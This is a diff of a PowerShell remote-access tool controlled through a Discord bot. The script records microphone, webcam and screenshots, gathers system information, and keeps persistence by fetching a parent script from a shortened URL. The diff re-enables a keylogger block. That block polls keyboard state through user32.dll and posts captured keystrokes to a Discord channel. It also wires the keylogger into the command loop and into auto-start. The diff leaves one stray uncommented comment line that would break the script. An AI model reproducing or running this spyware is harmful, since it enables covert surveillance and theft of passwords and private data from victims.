@@ -21,11 +21,11 @@
 $global:token = "$tk" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
-$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+$HideConsole = 0 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 $defaultstart = 1 # Option to start all jobs automatically upon running
-$global:parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
+$global:parent = "https://is.gd/ir32Mx" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
@@ -307,7 +307,7 @@ $script:jsonPayload = @{
 - **Microphone**: Record microphone clips and send to Discord
 - **Webcam**: Stream webcam pictures to Discord
 - **Screenshots**: Sends screenshots of the desktop to Discord
-#- **Keycapture**: Capture Keystrokes and send to Discord
+- **Keycapture**: Capture Keystrokes and send to Discord
 - **SystemInfo**: Gather System Info and send to Discord
 
 ### CONTROL
@@ -1594,73 +1594,73 @@ param([string]$token,[string]$PowershellID)
     }
 }
 
-# Scriptblock for keycapture to discord
-#$doKeyjob = {
-#param([string]$token,[string]$keyID)
-#    sleep 5
-#    $script:token = $token
-#    function sendMsg {
-#    param([string]$Message)
-#    $url = "https://discord.com/api/v10/channels/$keyID/messages"
-#    $wc = New-Object System.Net.WebClient
-#    $wc.Headers.Add("Authorization", "Bot $token")
-#    if ($Message) {
-#            $jsonBody = @{
-#                "content" = "$Message"
-#                "username" = "$env:computername"
-#            } | ConvertTo-Json
-#            $wc.Headers.Add("Content-Type", "application/json")
-#            $response = $wc.UploadString($url, "POST", $jsonBody)
-#	        $message = $null
-#        }
-#    }
-#    Function Kservice {   
-#        sendMsg -Message ":mag_right: ``Keylog Started`` :mag_right:"
-#        $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
-#        $API = Add-Type -M $API -Name 'Win32' -Names API -PassThru
-#        $pressed = [System.Diagnostics.Stopwatch]::StartNew()
-#        # Change for frequency
-#        $maxtime = [TimeSpan]::FromSeconds(10)
-#        $strbuild = New-Object -TypeName System.Text.StringBuilder 
-#        While ($true){
-#            $down = $false
-#            try{
-#            while ($pressed.Elapsed -lt $maxtime) {
-#                Start-Sleep -Milliseconds 30
-#                for ($capture = 8; $capture -le 254; $capture++){
-#                $keyst = $API::GetAsyncKeyState($capture)
-#                    if ($keyst -eq -32767) {
-#                    $down = $true
-#                    $pressed.Restart()
-#                    $null = [console]::CapsLock
-#                    $vtkey = $API::MapVirtualKey($capture, 3)
-#                    $kbst = New-Object Byte[] 256
-#                    $checkkbst = $API::GetKeyboardState($kbst)
-#                             
-#                        if ($API::ToUnicode($capture, $vtkey, $kbst, $strbuild, $strbuild.Capacity, 0)) {
-#                        $collected = $strbuild.ToString()
-#                            if ($capture -eq 27) {$collected = "[ESC]"}
-#                            if ($capture -eq 8) {$collected = "[BACK]"}
-#                            if ($capture -eq 13) {$collected = "[ENT]"}
-#                            $keymem += $collected 
-#                            }
-#                        }
-#                    }
-#                }
-#            }
-#            finally{
-#                If ($down) {
-#                    $escmsgsys = $keymem -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-#                    sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
-#                    $down = $false
-#                    $keymem = ""
-#                }
-#            }
-#        $pressed.Restart()
-#        Start-Sleep -Milliseconds 10
-#        }
-#    }Kservice
-#}
+ Scriptblock for keycapture to discord
+$doKeyjob = {
+param([string]$token,[string]$keyID)
+    sleep 5
+    $script:token = $token
+    function sendMsg {
+    param([string]$Message)
+    $url = "https://discord.com/api/v10/channels/$keyID/messages"
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", "Bot $token")
+    if ($Message) {
+            $jsonBody = @{
+                "content" = "$Message"
+                "username" = "$env:computername"
+            } | ConvertTo-Json
+            $wc.Headers.Add("Content-Type", "application/json")
+            $response = $wc.UploadString($url, "POST", $jsonBody)
+	        $message = $null
+        }
+    }
+    Function Kservice {   
+        sendMsg -Message ":mag_right: ``Keylog Started`` :mag_right:"
+        $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
+        $API = Add-Type -M $API -Name 'Win32' -Names API -PassThru
+        $pressed = [System.Diagnostics.Stopwatch]::StartNew()
+        # Change for frequency
+        $maxtime = [TimeSpan]::FromSeconds(10)
+        $strbuild = New-Object -TypeName System.Text.StringBuilder 
+        While ($true){
+            $down = $false
+            try{
+            while ($pressed.Elapsed -lt $maxtime) {
+                Start-Sleep -Milliseconds 30
+                for ($capture = 8; $capture -le 254; $capture++){
+                $keyst = $API::GetAsyncKeyState($capture)
+                    if ($keyst -eq -32767) {
+                    $down = $true
+                    $pressed.Restart()
+                    $null = [console]::CapsLock
+                    $vtkey = $API::MapVirtualKey($capture, 3)
+                    $kbst = New-Object Byte[] 256
+                    $checkkbst = $API::GetKeyboardState($kbst)
+                             
+                        if ($API::ToUnicode($capture, $vtkey, $kbst, $strbuild, $strbuild.Capacity, 0)) {
+                        $collected = $strbuild.ToString()
+                            if ($capture -eq 27) {$collected = "[ESC]"}
+                            if ($capture -eq 8) {$collected = "[BACK]"}
+                            if ($capture -eq 13) {$collected = "[ENT]"}
+                            $keymem += $collected 
+                            }
+                        }
+                    }
+                }
+            }
+            finally{
+                If ($down) {
+                    $escmsgsys = $keymem -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+                    sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
+                    $down = $false
+                    $keymem = ""
+                }
+            }
+        $pressed.Restart()
+        Start-Sleep -Milliseconds 10
+        }
+    }Kservice
+}
 
 # Scriptblock for microphone input to discord
 $audiojob = {
@@ -1836,9 +1836,9 @@ sleep 1
 NewChannel -name 'microphone'
 $global:MicrophoneID = $ChannelID
 sleep 1
-#NewChannel -name 'keycapture'
-#$global:keyID = $ChannelID
-#sleep 1
+NewChannel -name 'keycapture'
+$global:keyID = $ChannelID
+sleep 1
 NewChannel -name 'loot-files'
 $global:LootID = $ChannelID
 sleep 1
@@ -1957,13 +1957,13 @@ while ($true) {
             }
             else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
         }
-#        if ($messages -eq 'keycapture'){
-#            if (!($keysrunning)){
-#                Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
-#                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
-#            }
-#            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
-#        }
+        if ($messages -eq 'keycapture'){
+            if (!($keysrunning)){
+                Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
+            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
+        }
         if ($messages -eq 'systeminfo'){
             if (!($lootrunning)){
                 Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
@@ -1990,11 +1990,11 @@ while ($true) {
                 sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Gathering System Info!`` :white_check_mark:"
             }
             else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
-#            if (!($keysrunning)){
-#                Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
-#                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
-#            }
-#            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
+            if (!($keysrunning)){
+                Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
+            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
             if (!($audiorunning)){
                 Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID
                 sendMsg -Message ":microphone2: ``$env:COMPUTERNAME Microphone Session Started!`` :microphone2:"
